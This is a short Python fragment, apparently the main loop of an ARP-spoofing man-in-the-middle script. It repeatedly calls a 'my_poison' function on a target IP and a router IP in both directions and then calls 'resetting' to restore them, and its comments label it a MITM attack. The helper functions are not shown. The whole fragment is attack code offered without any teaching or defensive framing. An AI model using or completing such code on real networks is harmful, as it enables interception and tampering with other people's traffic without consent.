...
try:
    while True:
        my_poison("10.32.242.227","10.32.242.154")  # "10.32.242.227" - target ip "10.32.242.154" - router ip
        my_poison("10.32.242.154","10.32.242.227")  # Sending packets reverse as MITM attack
    ...
    resetting("10.32.242.227","10.32.242.154")
    resetting("10.32.242.154","10.32.242.227")